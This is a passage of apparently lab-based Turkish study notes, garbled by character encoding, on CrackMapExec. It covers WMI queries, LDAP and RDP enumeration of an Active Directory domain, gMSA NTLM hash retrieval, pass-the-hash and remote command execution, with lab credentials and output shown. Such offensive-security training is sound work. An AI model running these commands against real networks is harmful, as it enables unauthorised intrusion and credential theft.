"SELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE
'%sysmon%'"

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01!
SMB 10.129.203.121 445 DC01 Caption =>
Sysmon64.exe
SMB 10.129.203.121 445 DC01 ProcessId => 3220
```

WMI, sÄ±nÄ±flarÄ±nÄ± hiyerarÅŸik bir namespace iÃ§inde dÃ¼zenler. Bir sorgu gerÃ§ekleÅŸtirmek iÃ§in, Class Name ve bulunduÄŸu Namespace'i bilmemiz gerekir. YukarÄ±daki Ã¶rnekte, `Win32_Process` sÄ±nÄ±fÄ±nÄ± `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik Ã§Ã¼nkÃ¼ varsayÄ±lan olarak CME, `root\cimv2`'yi kullanÄ±r (bu bilgiyi --help menÃ¼sÃ¼nde gÃ¶rebiliriz).

BaÅŸka bir namespace'i sorgulamak iÃ§in onu belirtmemiz gerekir. Ã–rneÄŸin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sÄ±nÄ±fÄ±nÄ± sorgulayalÄ±m. Bu sÄ±nÄ±f, sistem Ã§alÄ±ÅŸÄ±rken dinamik olarak aÃ§Ä±lÄ±p kapanmasÄ± gereken cihazlar hakkÄ±nda bilgi tutar. Belirli bir konuyla ilgili WMI sÄ±nÄ±flarÄ±nÄ±n nasÄ±l bulunacaÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace

```
crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --wmi
"SELECT * FROM MSPower_DeviceEnable" --wmi-namespace "root\WMI"

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01!
SMB 10.129.203.121 445 DC01 InstanceName =>
PCI\VEN_15AD&DEV_0779&SUBSYS_077915AD&REV_00\4&23f707fc&0&00B8_0
SMB 10.129.203.121 445 DC01 Active => True
SMB 10.129.203.121 445 DC01 Enable => True
SMB 10.129.203.121 445 DC01
SMB 10.129.203.121 445 DC01 InstanceName =>
PCI\VEN_8086&DEV_10D3&SUBSYS_07D015AD&REV_00\005056FFFFB9E8F200_0
SMB 10.129.203.121 445 DC01 Active => True
SMB 10.129.203.121 445 DC01 Enable => True
SMB 10.129.203.121 445 DC01
SMB 10.129.203.121 445 DC01 InstanceName =>
USB\ROOT_HUB30\5&da8887e&0&0_0
SMB 10.129.203.121 445 DC01 Active => True
SMB 10.129.203.121 445 DC01 Enable => True
SMB 10.129.203.121 445 DC01
SMB 10.129.203.121 445 DC01 InstanceName =>
USB\VID_0E0F&PID_0003&MI_00\7&2a0405e8&0&0000_0
SMB 10.129.203.121 445 DC01 Active => True
SMB 10.129.203.121 445 DC01 Enable => True
SMB 10.129.203.121 445 DC01
SMB 10.129.203.121 445 DC01 InstanceName =>
USB\VID_0E0F&PID_0003&MI_01\7&2a0405e8&0&0001_0
SMB 10.129.203.121 445 DC01 Active => True
SMB 10.129.203.121 445 DC01 Enable => True
```

Not: Genellikle, WMI'yÄ± sorgulamak iÃ§in administrative ayrÄ±calÄ±klarÄ±na sahip olmamÄ±z gerekir, ancak bir administrator, WMI'yÄ± sorgulamak iÃ§in administrator olmayan bir hesabÄ± yapÄ±landÄ±rabilir. Bu durumda, WMI sorgularÄ±nÄ± gerÃ§ekleÅŸtirmek iÃ§in administrator olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.



AÅŸaÄŸÄ±daki bÃ¶lÃ¼m LDAP ve RDP protokollerini kullanarak numaralandÄ±rmayÄ± kapsayacaktÄ±r.

----


### LDAP and RDP Enumeration

Daha Ã¶nce, CrackMapExec'te en Ã§ok kullanÄ±lan protokol olan `SMB` ile bazÄ± numaralandÄ±rma seÃ§eneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandÄ±rma seÃ§eneÄŸi vardÄ±r

Bu bÃ¶lÃ¼mde, bu seÃ§eneklerden bazÄ±larÄ± ve hedeflerimizi nasÄ±l daha fazla numaralandÄ±rabileceÄŸimiz gÃ¶sterilecektir

### LDAP & RDP Commands

LDAP ve RDP protokolleri aÅŸaÄŸÄ±daki seÃ§enekleri iÃ§erir:

| Komut                                                                          | AÃ§Ä±klama                                                                                           |
| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`                  | Etkin Domain kullanÄ±cÄ±larÄ±nÄ± listeler.                                                             |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`                 | Domain gruplarÄ±nÄ± listeler.                                                                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayraÄŸÄ± olan kullanÄ±cÄ±larÄ± listeler.                                            |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± olan kullanÄ±cÄ± ve bilgisyalarÄ±nÄ± listeler.                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --get-sid`                | Domainin SID bilgisini alÄ±r.                                                                       |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --gmsa`                   | GMSA (GruplandÄ±rÄ±lmÄ±ÅŸ YÃ¶netici Hizmet HesaplarÄ±) ÅŸifrelerini listeler.                             |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --nla-screenshot`          | NLA (AÄŸ Seviyesinde Kimlik DoÄŸrulamasÄ±) devre dÄ±ÅŸÄ± ise RDP giriÅŸ ekranÄ±nÄ±n ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r. |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screenshot`              | BaÄŸlantÄ± baÅŸarÄ±lÄ±ysa RDP oturumunun ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r.                                        |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screentime`              | MasaÃ¼stÃ¼ gÃ¶rÃ¼ntÃ¼sÃ¼ iÃ§in bekleme sÃ¼resini belirtir.                                                 |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --res RES`                 | Ã‡Ã¶zÃ¼nÃ¼rlÃ¼k belirler (Ã¶rnek format: WIDTHxHEIGHT, varsayÄ±lan: 1024x768).                            |

HenÃ¼z Ã§alÄ±ÅŸmadÄ±klarÄ±mÄ±z varsa onlarÄ± gÃ¶zden geÃ§irelim.

### Enumerating Users and Groups

SMB protokolÃ¼nde yaptÄ±ÄŸÄ±mÄ±z gibi, `LDAP` ile de kullanÄ±cÄ±larÄ± ve gruplarÄ± listeleyebiliriz:

### Enumerating Users and Groups

```
crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! --
users --groups

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
LDAP dc01.inlanefreight.htb 389 DC01 [*] Total of
records returned 32
LDAP dc01.inlanefreight.htb 389 DC01 Administrator
Built-in account for administering the computer/domain
LDAP dc01.inlanefreight.htb 389 DC01 Guest
Built-in account for guest access to the computer/domain
LDAP dc01.inlanefreight.htb 389 DC01 krbtgt
Key Distribution Center Service Account
LDAP dc01.inlanefreight.htb 389 DC01 julio
LDAP dc01.inlanefreight.htb 389 DC01 david
LDAP dc01.inlanefreight.htb 389 DC01 john
User for kiosko IP 172.16.10.9
LDAP dc01.inlanefreight.htb 389 DC01
svc_workstations
LDAP dc01.inlanefreight.htb 389 DC01 carlos
LDAP dc01.inlanefreight.htb 389 DC01 robert
LDAP dc01.inlanefreight.htb 389 DC01 grace
LDAP dc01.inlanefreight.htb 389 DC01 peter
LDAP dc01.inlanefreight.htb 389 DC01 alina
Account for testing HR App. Password: HRApp123!
<SNIP>
LDAP dc01.inlanefreight.htb 389 DC01 Administrators
LDAP dc01.inlanefreight.htb 389 DC01 Users
LDAP dc01.inlanefreight.htb 389 DC01 Guests
LDAP dc01.inlanefreight.htb 389 DC01 Print Operators
LDAP dc01.inlanefreight.htb 389 DC01 Backup
Operators
LDAP dc01.inlanefreight.htb 389 DC01 Replicator
LDAP dc01.inlanefreight.htb 389 DC01 Remote Desktop
Users
LDAP dc01.inlanefreight.htb 389 DC01 Network
Configuration Operators
LDAP dc01.inlanefreight.htb 389 DC01 Performance
Monitor Users
LDAP dc01.inlanefreight.htb 389 DC01 Performance Log
Users
LDAP dc01.inlanefreight.htb 389 DC01 Distributed COM
Users
LDAP dc01.inlanefreight.htb 389 DC01 IIS_IUSRS
LDAP dc01.inlanefreight.htb 389 DC01 Cryptographic
Operators
LDAP dc01.inlanefreight.htb 389 DC01 Event Log
Readers
LDAP dc01.inlanefreight.htb 389 DC01 Certificate
Service DCOM Access
<SNIP>

```

Not: Domain FQDN'sini Ã§Ã¶zÃ¼mleyemezsek LDAP protokol iletiÅŸimlerinin Ã§alÄ±ÅŸmayacaÄŸÄ±nÄ± unutmayÄ±n. Domain DNS sunucularÄ±na baÄŸlanmÄ±yorsak, FQDN'yi `/etc/hosts` dosyasÄ±nda yapÄ±landÄ±rmamÄ±z gerekir


### Ä°lginÃ§ Hesap Ã–zelliklerini NumaralandÄ±rma

`ldap` protokolÃ¼, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± ile hesaplarÄ± tanÄ±mlamamÄ±za yardÄ±mcÄ± olacak birkaÃ§ seÃ§eneÄŸe daha sahiptir ve hatta `adminCount` deÄŸeri `1` olan tÃ¼m hesaplarÄ± sorgulayabiliriz.

`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmÄ±ÅŸsa, kullanÄ±cÄ± geÃ§erli password policy uzunluÄŸuna tabi deÄŸildir, yani daha kÄ±sa bir parolaya sahip olabilir veya hiÃ§ parola kullanmayabilir (domain'de boÅŸ parolalara izin veriliyorsa). Bu hesaplarÄ± tanÄ±mlamak iÃ§in  `--password-notrequired` seÃ§eneÄŸini kullanabiliriz.


### PASSWD_NOTREQD Attribute TanÄ±mlanmasÄ±

```
crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! --
password-not-required

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
LDAP dc01.inlanefreight.htb 389 DC01 User: Guest
Status: enabled
```

`TRUSTED_FOR_DELEGATION` attribute ayarlanÄ±rsa, bir servisin altÄ±nda Ã§alÄ±ÅŸtÄ±ÄŸÄ± servis hesabÄ± (kullanÄ±cÄ± veya bilgisayar) Kerberos yetkilendirmesi iÃ§in gÃ¼venilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldÄ±rÄ± tÃ¼rÃ¼ne `Kerberos Unconstrained Delegation` adÄ± verilir. Bu konu hakkÄ±nda daha fazla bilgi edinmek iÃ§in bu [blog](https://adsecurity.org/?p=1667) yazÄ±sÄ±nÄ± okuyabilirsiniz.

### Unconstrained Delegation Belirlenmesi

```
crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! --
trusted-for-delegation

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
LDAP dc01.inlanefreight.htb 389 DC01 MS01$
LDAP dc01.inlanefreight.htb 389 DC01 DC01$
```

`AdminCount` attribute, SDProp process'in bir kullanÄ±cÄ±yÄ± koruyup korumadÄ±ÄŸÄ±nÄ± belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar iÃ§in ACL permissions'Ä±n bir template'i olarak gÃ¶rev yapar. EÄŸer herhangi bir account ACE'si (Ã¶rneÄŸin, bir attacker tarafÄ±ndan) modified edilirse, bu process tarafÄ±ndan korunan account'larÄ±n ACL permissions'Ä±, `SDProp` process her Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda (default olarak her 60 dakikada bir Ã§alÄ±ÅŸÄ±r, ancak bu sÃ¼re modified edilebilir) templated permission set'e resetlenir. User, adminCount deÄŸeri 0 olarak set edilmiÅŸse veya specified deÄŸilse bu koruma kapsamÄ±na girmez. EÄŸer attribute value 1 olarak set edilmiÅŸse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'larÄ± target olarak arar. Bunlar genellikle privileged account'lardÄ±r ve further access veya full domain compromise ile sonuÃ§lanabilir.


### adminCount Attribute'u Sorgulama

```
crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! --
admin-count
SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
LDAP dc01.inlanefreight.htb 389 DC01 Administrator
LDAP dc01.inlanefreight.htb 389 DC01 Administrators
LDAP dc01.inlanefreight.htb 389 DC01 Print Operators
LDAP dc01.inlanefreight.htb 389 DC01 Backup
Operators
LDAP dc01.inlanefreight.htb 389 DC01 Replicator
LDAP dc01.inlanefreight.htb 389 DC01 krbtgt
LDAP dc01.inlanefreight.htb 389 DC01 Domain
Controllers
LDAP dc01.inlanefreight.htb 389 DC01 Schema Admins
LDAP dc01.inlanefreight.htb 389 DC01 Enterprise
Admins
LDAP dc01.inlanefreight.htb 389 DC01 Domain Admins
LDAP dc01.inlanefreight.htb 389 DC01 Server
Operators
LDAP dc01.inlanefreight.htb 389 DC01 Account
Operators
LDAP dc01.inlanefreight.htb 389 DC01 Read-only
Domain Controllers
LDAP dc01.inlanefreight.htb 389 DC01 Key Admins
LDAP dc01.inlanefreight.htb 389 DC01 Enterprise Key
Admins
LDAP dc01.inlanefreight.htb 389 DC01 julio
LDAP dc01.inlanefreight.htb 389 DC01 david
LDAP dc01.inlanefreight.htb 389 DC01 john
<SNIP>

```


### Domain SID'sini numaralandÄ±rma

BazÄ± domain attack'larÄ±, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'Ä±n sizi tanÄ±mlamak iÃ§in kullandÄ±ÄŸÄ± `unique bir ID` numarasÄ±dÄ±r. Domain SID ise domain'i tanÄ±mlayan unique bir ID numarasÄ±dÄ±r. CrackMapExec kullanarak domain SID'i elde etmek iÃ§in `--get-sid` flag'ini kullanabiliriz:

### Domain SID'i Toplama

```
crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! --
get-sid

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
LDAP dc01.inlanefreight.htb 389 DC01 Domain SID S-1-
5-21-3325992272-2815718403-617452758
```


### Group Managed Service Accounts (gMSA)

BaÄŸÄ±msÄ±z YÃ¶netilen Hizmet HesabÄ± (standalone Managed Service Account) (sMSA), aÅŸaÄŸÄ±dakileri saÄŸlayan yÃ¶netilen bir domain hesabÄ±dÄ±r:

* Otomatik parola yÃ¶netimi.
* BasitleÅŸtirilmiÅŸ service principal name (SPN) yÃ¶netimi.
* YÃ¶netimi diÄŸer yÃ¶neticilere devretme yeteneÄŸi

Bu yÃ¶netilen servis hesabÄ± (MSA) tÃ¼rÃ¼ Windows Server 2008 R2 ve Windows 7'de tanÄ±tÄ±lmÄ±ÅŸtÄ±r.

Group Managed Service Account (gMSA) domain iÃ§inde aynÄ± iÅŸlevselliÄŸi saÄŸlar ancak aynÄ± zamanda bu iÅŸlevselliÄŸi birden fazla sunucuya geniÅŸletir.

Bir gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuma ayrÄ±calÄ±klarÄ±na sahip bir hesabÄ± belirlemek iÃ§in PowerShell'i kullanabiliriz (komut yÃ¼rÃ¼tmeyi bir sonraki bÃ¶lÃ¼mde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z):

### Enumerating Accounts with gMSA Privileges

```
crackmapexec winrm dc01.inlanefreight.htb -u robert -p Inlanefreight01! -X
"Get-ADServiceAccount -Filter * -Properties
PrincipalsAllowedToRetrieveManagedPassword"

SMB dc01.inlanefreight.htb 5985 DC01 [*] Windows
10.0 Build 17763 (name:DC01) (domain:inlanefreight.htb)
HTTP dc01.inlanefreight.htb 5985 DC01 [*]
http://dc01.inlanefreight.htb:5985/wsman
WINRM dc01.inlanefreight.htb 5985 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
WINRM dc01.inlanefreight.htb 5985 DC01 [+] Executed
command
WINRM dc01.inlanefreight.htb 5985 DC01
DistinguishedName : CN=svc_inlaneadm,CN=Managed
Service Accounts,DC=inlanefreight,DC=htb
Enabled : True
Name : svc_inlaneadm
ObjectClass : msDSGroupManagedServiceAccount
ObjectGUID : 6328a77f-9696-40b4-82b7-
725ac19564b6
PrincipalsAllowedToRetrieveManagedPassword :
{CN=engels,CN=Users,DC=inlanefreight,DC=htb}
SamAccountName : svc_inlaneadm$
SID : S-1-5-21-3325992272-
2815718403-617452758-6123
UserPrincipalName :

```


YukarÄ±daki Ã¶rnekte, `engels` kullanÄ±cÄ±sÄ±nÄ±n `PrincipalsAllowedToRetrieveManagedPassword` ayrÄ±calÄ±ÄŸÄ±na sahip olduÄŸunu gÃ¶rebiliriz, bu da `svc_inlaneadm$` gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuyabileceÄŸi anlamÄ±na gelir. gMSA parolasÄ±nÄ± okuma hakkÄ±na sahip bir hesabÄ± tehlikeye atarsak, hesabÄ±n `NTLM` parola hash'ini almak iÃ§in `--gmsa` seÃ§eneÄŸini kullanabiliriz.


### gMSA ParolasÄ±nÄ± Edinme

```
crackmapexec ldap dc01.inlanefreight.htb -u engels -p Inlanefreight1998! --gmsa

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 636 DC01 [+]
inlanefreight.htb\engels:Inlanefreight1998!
LDAP dc01.inlanefreight.htb 636 DC01 [*] Getting
GMSA Passwords
LDAP dc01.inlanefreight.htb 636 DC01 Account:
svc_inlaneadm$ NTLM: 76fa2df9e8f656ae81b0bd271bef0346
```

Bu kimlik bilgilerini kullanmak iÃ§in, hash'ler iÃ§in -H seÃ§eneÄŸini kullanabiliriz.

### svc_inlaneadm$ HesabÄ± ile PaylaÅŸÄ±lan KlasÃ¶rleri Ä°nceleme

```
crackmapexec smb dc01.inlanefreight.htb -u svc_inlaneadm$ -H
76fa2df9e8f656ae81b0bd271bef0346 --shares

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB dc01.inlanefreight.htb 445 DC01 [+]
inlanefreight.htb\svc_inlaneadm$:76fa2df9e8f656ae81b0bd271bef0346
SMB dc01.inlanefreight.htb 445 DC01 [+] Enumerated shares
SMB dc01.inlanefreight.htb 445 DC01 Share Permissions Remark
SMB dc01.inlanefreight.htb 445 DC01 -----
----------- ------
SMB dc01.inlanefreight.htb 445 DC01 ADMIN$ Remote Admin
SMB dc01.inlanefreight.htb 445 DC01 C$ Default share
SMB dc01.inlanefreight.htb 445 DC01 CertEnroll
READ Active Directory Certificate Services share
<SNIP>
```


---

### RDP Screenshots

RDP protokolÃ¼ aracÄ±lÄ±ÄŸÄ±yla kullanÄ±cÄ± adlarÄ±nÄ± numaralandÄ±rmak iÃ§in CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnÄ±zca `NLA` ile izin verme seÃ§eneÄŸi devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸsa, oturum aÃ§ma isteminin ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ almak iÃ§in `--nlascreenshot` seÃ§eneÄŸini kullanabiliriz


### Enumerate Login Prompt

```
crackmapexec rdp 10.129.204.177 --nla-screenshot
RDP 10.129.204.177 3389 DC01 [*] Windows 10 or
Windows Server 2016 Build 17763 (name:DC01) (domain:inlanefreight.htb)
(nla:False)
RDP 10.129.204.177 3389 DC01 NLA Screenshot saved
/home/plaintext/.cme/screenshots/DC01_10.129.204.177_2022-12-19_124833.png
```

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz.


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in Eye Kullanma

```
eom /home/plaintext/.cme/screenshots/DC01_10.129.203.121_2022-11-
23_163607.png
```

![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

EÄŸer bir kullanÄ±cÄ± adÄ± ve parolamÄ±z varsa, `--screenshot` seÃ§eneÄŸi ile RDP protokolÃ¼nÃ¼ kullanarak da ekran gÃ¶rÃ¼ntÃ¼sÃ¼ alabiliriz. Bu seÃ§enek `--screentime` ile birleÅŸtirilebilir, varsayÄ±lan olarak `10`, RDP baÄŸlantÄ±sÄ± aÃ§Ä±ldÄ±ktan sonra ekran gÃ¶rÃ¼ntÃ¼sÃ¼ almak iÃ§in bekleyeceÄŸi sÃ¼redir. Bu, bir hedef makineye baÄŸlandÄ±ÄŸÄ±mÄ±zda ve hedefin masaÃ¼stÃ¼nÃ¼ yÃ¼klemesi 10 saniyeden fazla sÃ¼rdÃ¼ÄŸÃ¼nde kullanÄ±ÅŸlÄ±dÄ±r.

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ seÃ§eneÄŸiyle birleÅŸtirilebilecek bir diÄŸer seÃ§enek de RDP baÄŸlantÄ±sÄ± sÄ±rasÄ±ndaki ekran Ã§Ã¶zÃ¼nÃ¼rlÃ¼ÄŸÃ¼ne karÅŸÄ±lÄ±k gelen `--res` seÃ§eneÄŸidir. Bu seÃ§enek yararlÄ±dÄ±r Ã§Ã¼nkÃ¼ aktif bir RDP oturumu bulursak, kullanÄ±cÄ±nÄ±n ekranÄ±nÄ±n boyutuna baÄŸlÄ± olarak tÃ¼m iÃ§eriÄŸi gÃ¶rebiliriz veya gÃ¶remeyiz. VarsayÄ±lan olarak bu seÃ§enek `1024x768` olarak ayarlanmÄ±ÅŸtÄ±r


### Screenshot Alma

```
crackmapexec rdp 10.129.204.177 -u julio -p Password1 --screenshot --
screentime 5 --res 1280x720

RDP 10.129.204.177 3389 DC01 [*] Windows 10 or
Windows Server 2016 Build 17763 (name:DC01) (domain:inlanefreight.htb)
(nla:False)
RDP 10.129.204.177 3389 DC01 [+]
inlanefreight.htb\julio:Password1 (Pwn3d!)
RDP 10.129.204.177 3389 DC01 Screenshot saved
/home/plaintext/.cme/screenshots/DC01_10.129.203.121_2022-11-23_163607.png
```


Not: `--screentime` ve `--res` isteÄŸe baÄŸlÄ± bayraklardÄ±r.

Son olarak, ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz:


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in GÃ¶zÃ¼nÃ¼ Kullanma

```
eom /home/plaintext/.cme/screenshots/DC01_10.129.203.121_2022-11- 23_163607.png
```

![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)

Bu bÃ¶lÃ¼mde, hedeflerimize ulaÅŸmamÄ±za yardÄ±mcÄ± olabilecek LDAP ve RDP kullanarak Ã§eÅŸitli numaralandÄ±rma seÃ§eneklerini inceledik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼m, CrackMapExec kullanarak komutlarÄ±n nasÄ±l Ã§alÄ±ÅŸtÄ±rÄ±lacaÄŸÄ±nÄ± gÃ¶zden geÃ§irecektir.


---

### Command Execution

Remote target Ã¼zerinde local administrator olarak bir komut Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸmadan Ã¶nce `UAC`'nin varlÄ±ÄŸÄ±nÄ± kontrol etmeliyiz. UAC etkinleÅŸtirildiÄŸinde, ki bu varsayÄ±lan durumdur, yalnÄ±zca `RID 500`'e sahip administrator hesabÄ± (varsayÄ±lan administrator) remote komutlarÄ± yÃ¼rÃ¼tebilir. Durumun bÃ¶yle olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in iki registry key vardÄ±r:

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`

VarsayÄ±lan olarak, `LocalAccountTokenFilterPolicy` deÄŸeri 0 olarak ayarlanmÄ±ÅŸtÄ±r, yani yalnÄ±zca built-in administrator hesabÄ± (RID 500) administration gÃ¶revlerini gerÃ§ekleÅŸtirebilir. Local administrator grubunda olsak bile, yalnÄ±zca kullanÄ±cÄ±mÄ±zÄ±n RID'si `500` ise remote komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. DeÄŸer 1 olarak ayarlanÄ±rsa tÃ¼m administrative hesaplarÄ± yÃ¶netim gÃ¶revlerini yÃ¼rÃ¼tebilir.

Administrator yapÄ±landÄ±rabileceÄŸi bir diÄŸer ayar da local administrator hesabÄ±nÄ±n (RID 500) remote yÃ¶netim gÃ¶revlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry deÄŸerini 1 olarak ayarlayarak yapÄ±labilir; bu, built-in administrator hesabÄ±nÄ±n (RID 500) remote administrative tasks (remote yÃ¶netim gÃ¶revleri) gerÃ§ekleÅŸtiremeyeceÄŸi anlamÄ±na gelir.


### Administrator Olarak Komut YÃ¼rÃ¼tme

KomutlarÄ± Ã§alÄ±ÅŸtÄ±rmak ve administrators grubuna kimlerin Ã¼ye olduÄŸunu gÃ¶rmek iÃ§in Administrator hesabÄ±nÄ± kullanalÄ±m. Windows komut satÄ±rÄ± komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in `-x` seÃ§eneÄŸini ve ardÄ±ndan Ã§alÄ±ÅŸtÄ±rmak istediÄŸimiz komutu kullanmamÄ±z gerekir.


### Bir Komutu Administrator Olarak Ã‡alÄ±ÅŸtÄ±rma

```
crackmapexec smb 10.129.204.133 -u Administrator -p 'AnotherC0mpl3xP4$' -
-local-auth -x "net localgroup administrators"

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
MS01\Administrator:AnotherC0mpl3xP4$ (Pwn3d!)
SMB 10.129.204.133 445 MS01 [+] Executed command
SMB 10.129.204.133 445 MS01 Alias name
administrators
SMB 10.129.204.133 445 MS01 Comment
Administrators have complete and unrestricted access to the
computer/domain
SMB 10.129.204.133 445 MS01
SMB 10.129.204.133 445 MS01 Members
SMB 10.129.204.133 445 MS01
SMB 10.129.204.133 445 MS01 ----------------------
---------------------------------------------------------
SMB 10.129.204.133 445 MS01 Administrator
SMB 10.129.204.133 445 MS01 INLANEFREIGHT\david
SMB 10.129.204.133 445 MS01 INLANEFREIGHT\DomainAdmins
SMB 10.129.204.133 445 MS01 INLANEFREIGHT\julio
SMB 10.129.204.133 445 MS01 INLANEFREIGHT\robert
SMB 10.129.204.133 445 MS01 localadmin
SMB 10.129.204.133 445 MS01 The command completed
successfully.
```


### RID 500 Olmayan Hesap Olarak Komut YÃ¼rÃ¼tme

YukarÄ±daki komutta, `localadmin` local user `Administrators` grubundadÄ±r, ancak remote komutu Ã§alÄ±ÅŸtÄ±ramaz:

### Komutu localadmin olarak Ã§alÄ±ÅŸtÄ±rma

```
crackmapexec smb 10.129.204.133 -u localadmin -p Password99! --local-auth
-x whoami

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
